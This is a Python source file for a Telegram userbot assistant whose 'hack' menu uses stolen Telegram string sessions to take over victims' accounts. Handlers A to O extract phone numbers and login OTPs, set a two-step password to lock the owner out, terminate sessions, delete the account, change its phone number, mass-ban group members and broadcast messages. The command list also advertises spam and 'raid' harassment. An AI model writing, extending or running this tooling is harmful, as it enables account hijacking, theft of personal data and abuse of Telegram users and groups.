import asyncio
import os
import re
from os import system

from telethon import Button, events

api_id = os.environ.get("APP_ID")
api_hash = os.environ.get("API_HASH")

from Eaglebot import *

from . import *
from .helpers.hack import *

mybot = "@Gaana_MusicBot"

EagleBoy = 7396541413


from telethon import Button, custom, events

from .core.logger import logging
from .core.session import eagle, tgbot

LOGS = logging.getLogger("EagleUserBot")
EAGLE_PIC = ""

onbot = "start - ᴄʜᴇᴄᴋ ɪғ ɪ ᴀᴍ ᴀʟɪᴠᴇ \nhelp - ᴄʜᴇᴄᴋ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅ\nalive- \nping - ᴛᴏ ᴄʜᴇᴄᴋ ᴘɪɴɢ ᴏғ ʙᴏᴛ\nuinfo - ᴛᴏ ᴄʜᴇᴄᴋ ɪɴғᴏ ᴏғ ᴀssɪsᴛᴀɴᴛ ᴄʜᴀᴛ\nbroadcast - ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇ ᴛᴏ ᴀʟʟ ᴛʜᴇ ᴘᴇʀsᴏɴ ᴡʜᴏ ʜᴀs sᴛᴀʀᴛᴇᴅ ᴜʀ ʙᴏᴛ\nban - ᴛᴏ ʙᴀɴ ᴘᴇʀsᴏɴ ᴛᴏ ʙʟᴏᴄᴋ ᴍᴇssᴀɢᴇ ɪɴ ᴀssɪsᴛᴀɴᴛ ᴄʜᴀᴛ\nunban - ᴛᴏ ᴜɴʙᴀɴ ᴘᴇʀsᴏɴ ᴀʟʟᴏᴡ ᴛᴏ ᴍᴇssᴀɢᴇ ɪɴ ᴀssɪsᴛᴀɴᴛ ᴄʜᴀᴛ\neval - ᴛᴏ ʀᴜɴ ᴘʏᴛʜᴏɴ ᴄᴏᴅᴇ\npurge - ᴛᴏ ᴘᴜʀɢᴇ ᴍᴇssᴀɢᴇ ғʀᴏᴍ ʀᴇᴘʟɪᴇᴅ\ndel - ᴛᴏ ᴅᴇʟᴇᴛᴇ ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ\nbigspam - ᴛᴏ sᴘᴀᴍ ᴛʜʀᴏᴜɢʜ ʙᴏᴛ ᴠᴀʟᴜᴇ > 100\ndelayspam - sᴘᴀᴍ ᴡɪᴛʜ ᴅᴇʟᴀʏ\nraid - ᴛᴏ ᴀʙᴜsᴇ ᴀɴʏᴏɴᴇ ʙʏ  username/name/reply\nreplyraid - ᴛᴏ ᴀᴄᴛɪᴠᴀᴛᴇ ʀᴀɪᴅ ᴏɴ ᴀɴʏᴏɴᴇ\ndreplyraid - ᴛᴏ sᴛᴏᴘ ʀᴀɪᴅ\nspam - ᴛᴏ sᴘᴀᴍ ᴡɪᴛʜ ᴄʜᴀᴛ ᴠᴀʟᴜᴇ < 100\nhack - ʜᴀᴄᴋ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ᴛʜʀᴏᴜɢʜ sᴛᴇɪɴɢsᴇssɪᴏɴ"
perf = "[ ♡_🫧𝆺꯭𝅥˶‌‌֟፝★Ｅ𝓪𝘨ļ૯⁂★🍷┼❤️༆ ]"

bot = eagle


async def killer():
    EAGLE_USER = bot.me.first_name
    The_EagleBoy = bot.uid
    eag_mention = f"[{EAGLE_USER}](tg://user?id={The_EagleBoy})"
    name = f"{eag_mention}'s ᴀꜱꜱɪꜱᴛᴀɴᴛ"
    description = (
        f" ɪ ᴀᴍ ᴀssɪsᴛᴀɴᴛ ᴏғ{eag_mention}.ᴛʜɪꜱ ʙᴏᴛ ᴄᴀɴ ʜᴇʟᴘ ᴜ ᴛᴏ ᴄʜᴀᴛ ᴡɪᴛʜ ᴍʏ ᴍᴀꜱᴛᴇʀ"
    )
    starkbot = await eagle.tgbot.get_me()
    bot_name = starkbot.first_name
    botname = f"@{starkbot.username}"
    if bot_name.endswith("Assistant"):
        print("Bot Starting")
    else:
        try:
            await bot.send_message("@BotFather", "/setinline")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", perf)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setcommands")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", onbot)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setname")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", name)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setdescription")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", description)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setuserpic")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_file(
                "@BotFather", "Eaglebot/helpers/resources/pics/main.jpg"
            )
            await asyncio.sleep(2)
        except Exception as e:
            print(e)


@eagle.tgbot.on(events.NewMessage(pattern="/start", func=lambda x: x.is_group))
async def stat(event):
    keybard = [(Button.inline("⭐ ᴄʟɪᴄᴋ ʜᴇʀᴇ 💫", data="start"))]
    await tgbot.send_message(event.chat_id, f"ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ᴛᴏ ꜱᴛᴀʀᴛ", buttons=keybard)


@eagle.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
async def help(event):
    starkbot = await tgbot.get_me()
    bot_id = starkbot.first_name
    if event.query.user_id is not bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message=f"ʜᴇʏ, ɪ ᴀᴍ ʏᴏᴜʀ {bot_id}'ꜱ ᴀꜱꜱɪꜱᴛᴀɴᴛ ʙᴏᴛ.\nɪ ᴀᴍ ʜᴇʀᴇ ᴛᴏ ʜᴇʟᴘ ᴜ\n\nᴘᴏᴡᴇʀᴇᴅ ʙʏ [♡_🫧𝆺꯭𝅥˶‌‌֟፝β𝝰꯭‌𝞉 ꯭𝝡꯭𝞄꯭𝞌𝞉꯭𝝺꯭𝆺꯭𝅥🍷┼❤️༆](https://t.me/ll_BAD_MUNDA_ll)",
            buttons=[
                [
                    Button.url(" ᴄʜᴀᴛ ɢʀᴏᴜᴘ ", "https://t.me/PBX_CHAT"),
                    Button.url(" ᴄʜᴀɴɴᴇʟ ", "https://t.me/HEROKUBIN_01"),
                ],
                [
                    custom.Button.inline(" ᴜsᴇʀs ", data="users"),
                    custom.Button.inline(" sᴇᴛᴛɪɴɢs ", data="osg"),
                ],
                [custom.Button.inline(" ʜᴀᴄᴋ ", data="hack")],
            ],
        )
    else:
        await event.answer(
            "ʜʏᴇᴇᴇ ᴍᴇʟᴀ ʙᴀʙᴜ👻", cache_time=0, alert=True
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"osg")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="ᴡʜɪᴄʜ ᴛʏᴘᴇ ᴏꜰ ꜱᴇᴛᴛɪɴɢ ᴅᴏ ᴜ ᴡᴀɴᴛ ꜱɪʀ",
            buttons=[
                [
                    custom.Button.inline(" ʀᴇsᴛᴀʀᴛ ", data="res_tart"),
                ],
                [
                    custom.Button.inline(" sᴇᴛ ᴠᴀʀ", data="strvar"),
                ],
                [custom.Button.inline(" ʙᴀᴄᴋ ", data="start")],
            ],
        )
    else:
        await event.answer(
            "ᴍᴇʟᴇ ʙᴀʙᴜ🥺❤️ ",
            cache_time=0,
            alert=True,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"shutdown")))
async def rel(event):
    if event.query.user_id == bot.uid:
        await event.answer("ShutDown ♡_🫧𝆺꯭𝅥˶‌‌֟፝★Ｅ𝓪𝘨ļ૯⁂★🍷┼❤️༆†...", cache_time=0, alert=True)
        if BOTLOG:
            await event.client.send_message(
                BOTLOG_CHATID, "#SHUTDOWN \n" "Bot shut down"
            )
        if HEROKU_APP is not None:
            HEROKU_APP.process_formation()["worker"].scale(0)
        else:
            os._exit(143)
    else:
        await event.answer(
            "ꜱᴏʀʀʏ ᴜ ᴅᴏɴᴛ ʜᴀᴠᴇ ᴀᴄᴄᴇꜱꜱ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ʙᴜᴛᴛᴏɴ", cache_time=0, alert=True
        )


@eagle.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"res_tart")))
async def res_ttart(event):
    if event.query.user_id == bot.uid:
        await event.answer("ʀᴇꜱᴛᴀʀᴛɪɴɢ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ 4 ᴍɪɴ... ", cache_time=0, alert=True)
        if BOTLOG:
            EAGLE = await event.client.send_message(
                BOTLOG_CHATID, "# RESTART \n" "Bot Restarted"
            )
        try:
            await eagle.disconnect()
        except CancelledError:
            pass
        except Exception as e:
            LOGS.error(e)
    else:
        await event.answer(
            "ꜱᴏʀʀʏ ᴏɴʟʏ ᴍʏ ᴍᴀꜱᴛᴇʀ ᴄᴀɴ ᴀᴄᴄᴇꜱꜱ ɪᴛ", cache_time=0, alert=True
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"strvar")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="ᴡʜɪᴄʜ ᴛʏᴘᴇ ᴏꜰ ꜱᴇᴛᴛɪɴɢ ᴅᴏ ᴜ ᴡᴀɴᴛ ꜱɪʀ",
            buttons=[
                [
                    custom.Button.inline(" sᴇᴛ ᴠᴀʀ ", data="setvar"),
                    custom.Button.inline(" ɢᴇᴛ ᴠᴀʀ ", data="gevar"),
                ],
                [custom.Button.inline(" ᴅᴇʟ ᴠᴀʀ ", data="delvar")],
            ],
        )
    else:
        await event.answer("ꜱᴏʀʀʏ ᴛʜɪꜱ ʙᴜᴛᴛᴏɴ ᴏɴʟʏ ᴍʏ ᴍᴀꜱᴛᴇʀ", cache_time=0, alert=True)


@eagle.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"setvar")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        if (Config.API_KEY is None) or (Config.APP_NAME is None):
            return await x.send_message(
                "Set the required vars in heroku to function this normally `API_KEY` and `APP_NAME`.",
            )
        await x.send_message("👨‍💻 GIVE VAR NAME")
        variable = await x.get_response()
        await x.send_message("👨‍💻 GIVE VALUE")
        value = await x.get_response()
        await setvar(variable.text, value.text)
        await event.reply("Done Now Wait For A Minute To Complete Logs")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"getvar")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        if (Config.API_KEY is None) or (Config.APP_NAME is None):
            return await x.send_message(
                "Set the required vars in heroku to function this normally `API_KEY` and `APP_NAME`.",
            )
        await x.send_message("👨‍💻 GIVE VAR NAME")
        variable = await x.get_response()
        lol = await getvar(variable.text)
        await event.reply(f"{lol}")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"delvar")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        if (Config.API_KEY is None) or (Config.APP_NAME is None):
            return await x.send_message(
                "ꜱᴇᴛ ᴛʜᴇ ʀᴇQᴜɪʀᴇᴅ ᴠᴀʀꜱ ɪɴ ʜᴇʀᴏᴋᴜ ᴛᴏ ꜰᴜɴᴄᴛɪᴏɴ ᴛʜɪꜱ ɴᴏʀᴍᴀʟʟʏ `API_KEY` and `APP_NAME`.",
            )
        await x.send_message("👨‍💻 GIVE VAR NAME")
        variable = await x.get_response()
        lol = await delvar(variable.text)
        await event.reply(f"ᴅᴏɴᴇ ɴᴏᴡ ᴡᴀɪᴛ ꜰᴏʀ ᴀ ᴍɪɴᴜᴛᴇ ᴛᴏ ᴄᴏᴍᴘʟᴇᴛᴇ ʟᴏɢꜱ \n\n {lol}")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"close")))
async def help(event):
    await event.delete()


menu = """
ʀᴇᴘʟʏ ᴛᴏ ᴍʏ ᴍᴇꜱꜱᴀɢᴇ ɪꜰ ɪ ᴀᴍ ᴜꜱɪɴɢ ɪɴ ɢʀᴏᴜᴘ 💫

"A" :~ [ᴄʜᴇᴄᴋ ᴜꜱᴇʀ ᴏᴡɴ ɢʀᴏᴜᴘꜱ ᴀɴᴅ ᴄʜᴀɴɴᴇʟꜱ]

"B" :~ [ᴄʜᴇᴄᴋ ᴜꜱᴇʀ ᴀʟʟ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ʟɪᴋᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ, ᴜꜱʀɴᴀᴍᴇ... ᴇᴛᴄ]

"C" :~ [ʙᴀɴ ᴀ ɢʀᴏᴜᴘ {ɢɪᴠᴇ ᴍᴇ ꜱᴛʀɪɴɢꜱᴇꜱꜱɪᴏɴ ᴀɴᴅ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ ᴜꜱᴇʀɴᴀᴍᴇ ɪ ᴡɪʟʟ ʙᴀɴ ᴀʟʟ ᴍᴇᴍʙᴇʀꜱ ᴛʜᴇʀᴇ}]

"D" :~ [ᴋɴᴏᴡ ᴜꜱᴇʀ ʟᴀꜱᴛ ᴏᴛᴘ {1ꜱᴛ ᴜꜱᴇ ᴏᴘᴛɪᴏɴ ʙ ᴛᴀᴋᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴀɴᴅ ʟᴏɢɪɴ ᴛʜᴇʀᴇ ᴀᴄᴄᴏᴜɴᴛ ᴛʜᴇɴ ᴜꜱᴇ ᴍᴇ ɪ ᴡɪʟʟ ɢɪᴠᴇ ʏᴏᴜ ᴏᴛᴘ}]

"E" :~ [ᴊᴏɪɴ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴠɪᴀ ꜱᴛʀɪɴɢꜱᴇꜱꜱɪᴏɴ]

"F" :~ [ʟᴇᴀᴠᴇ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ᴠɪᴀ ꜱᴛʀɪɴɢꜱᴇꜱꜱɪᴏɴ]

"G" :~ [ᴅᴇʟᴇᴛᴇ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ]

"H" :~ [ᴄʜᴇᴄᴋ ᴜꜱᴇʀ ᴛᴡᴏ ꜱᴛᴇᴘ ɪꜱ ᴇɴᴇᴀʙʟᴇ ᴏʀ ᴅɪꜱᴀʙʟᴇ]

"I" :~ [ᴛᴇʀᴍɪɴᴀᴛᴇ ᴀʟʟ ᴄᴜʀʀᴇɴᴛ ᴀᴄᴛɪᴠᴇ ꜱᴇꜱꜱɪᴏɴꜱ ᴇxᴄᴇᴘᴛ ʏᴏᴜʀ ꜱᴛʀɪɴɢꜱᴇꜱꜱɪᴏɴ]

"J" :~ [ᴅᴇʟᴇᴛᴇ ᴀᴄᴄᴏᴜɴᴛ]

"K" :~ [ᴅᴇᴍᴏᴛᴇ ᴀʟʟ ᴀᴅᴍɪɴꜱ ɪɴ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ]

"L" ~ [ᴘʀᴏᴍᴏᴛᴇ ᴀ ᴍᴇᴍʙᴇʀ ɪɴ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ]

"M" ~ [ᴄʜᴀɴɢᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴜꜱɪɴɢ ꜱᴛʀɪɴɢꜱᴇꜱꜱɪᴏɴ]

ᴄʜɪʟʟ ʙᴀʙʏ 🦅
"""

keyboard = [
    [
        Button.inline("A", data="Ahack"),
        Button.inline("B", data="Bhack"),
        Button.inline("C", data="Chack"),
        Button.inline("D", data="Dhack"),
        Button.inline("E", data="Ehack"),
    ],
    [
        Button.inline("F", data="Fhack"),
        Button.inline("G", data="Ghack"),
        Button.inline("H", data="Hhack"),
        Button.inline("I", data="Ihack"),
        Button.inline("J", data="Jhack"),
    ],
    [
        Button.inline("K", data="Khack"),
        Button.inline("L", data="Lhack"),
        Button.inline("M", data="Mhack"),
        Button.inline("N", data="Nhack"),
        Button.inline("O", data="Ohack"),
    ],
    [Button.inline("Back", data="osg")],
]


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"hack")))
async def start(event):
    global menu
    if event.query.user_id == bot.uid:
        await event.delete()
        async with tgbot.conversation(event.chat_id) as x:
            await x.send_message(
                f"ᴄʜᴏᴏꜱᴇ ᴡʜᴀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴡɪᴛʜ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ \n\n{menu}", buttons=keyboard
            )
    else:
        await event.answer(
            "ᴜ ᴅᴏɴᴛ ʜᴀᴠᴇ ʀɪɢʜᴛ ᴛᴏ ᴀᴄᴄᴇꜱꜱ ᴛʜɪꜱ ʜᴀᴄᴋ ʙᴜᴛᴛᴏɴ", cache_time=0, alert=True
        )


@eagle.tgbot.on(
    events.NewMessage(pattern="/hack", func=lambda x: x.sender_id == bot.uid)
)
async def start(event):
    global menu
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message(
            f"ᴄʜᴏᴏꜱᴇ ᴡʜᴀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴡɪᴛʜ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ \n\n{menu}", buttons=keyboard
        )


@eagle.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("📍GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.\n /hack", buttons=keyboard
            )
        try:
            i = await userchannels(strses.text)
        except:
            return await event.reply(
                "This StringSession Has Been Terminated.\n/hack", buttons=keyboard
            )
        if len(i) > 3855:
            file = open("session.txt", "w")
            file.write(i + "\n\nDetails BY EagleBoy")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(
                i + "\n\nThanks For using EagleBoyBot. \n/hack", buttons=keyboard
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Bhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("🔰GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.\n/hack", buttons=keyboard
            )
        i = await userinfo(strses.text)
        await event.reply(
            i + "\n\nThanks For using EagleBoy Bot.\n/hack", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Chack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "String Session Has Been Terminated", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await userbans(strses.text, grpid.text)
        await event.reply(
            "Banning all members. Thanks For using EagleBoy Bot", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Dhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        i = await usermsgs(strses.text)
        await event.reply(i + "\n\nThanks For using EagleBoy Bot", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await joingroup(strses.text, grpid.text)
        await event.reply(
            "Joined the Channel/Group Thanks For using EagleBoy Bot", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Fhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await leavegroup(strses.text, grpid.text)
        await event.reply(
            "Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ghack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await delgroup(strses.text, grpid.text)
        await event.reply(
            "Deleted the Channel/Group Thanks For using EagleBoyBot.", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Hhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession is terminated maybe.", buttons=keyboard
            )
        i = await user2fa(strses.text)
        if i:
            await event.reply(
                "User don't have two step thats why now two step is `EagleBoy Bot Is best` you can login now\n\nThanks For using EagleBoy Bot.",
                buttons=keyboard,
            )
        else:
            await event.reply("Sorry User Have two step already", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ihack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await terminate(strses.text)
        await event.reply(
            "The all sessions are terminated\n\nThanks For using EagleBoyBot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Jhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await delacc(strses.text)
        await event.reply(
            "The Account is deleted SUCCESSFULLLY\n\nThanks For using EagleBoy Bot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Khack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
        grp = await x.get_response()
        await x.send_message("NOW GIVE USER USERNAME")
        user = await x.get_response()
        await promote(strses.text, grp.text, user.text)
        await event.reply(
            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using EagleBoy Bot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Lhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
        pro = await x.get_response()
        try:
            await demall(strses.text, pro.text)
        except:
            pass
        await event.reply(
            "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using EagleBoyBot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Mhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession is terminated maybe", buttons=keyboard
            )
        await x.send_message(
            "GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] "
        )
        number = (await x.get_response()).text
        try:
            result = await change_number(strses.text, number)
            await event.respond(
                result
                + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp"
            )
            await asyncio.sleep(20)
            await x.send_message("NOW GIVE PHONE CODE HASH")
            phone_code_hash = (await x.get_response()).text
            await x.send_message("NOW GIVE THE OTP")
            otp = (await x.get_response()).text
            changing = await change_number_code(
                strses.text, number, phone_code_hash, otp
            )
            if changing:
                await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
            else:
                await event.respond("Something is wrong")
        except Exception as e:
            await event.respond(
                "SEND THIS ERROR TO - @PBX_CHAT\n**LOGS**\n" + str(e)
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ohack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("NOW GIVE USER USERNAME")
        user = await x.get_response()
        await gpromote(strses.text, user.text)
        await event.reply(
            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using EagleBoy Bot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Nhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("Now Give Message")
        msg = await x.get_response()
        await gcast(strses.text, msg.text)
        await event.reply(
            "Done 😗😗\n\nThanks For Using EagleBoy Bot.",
            buttons=keyboard,
        )
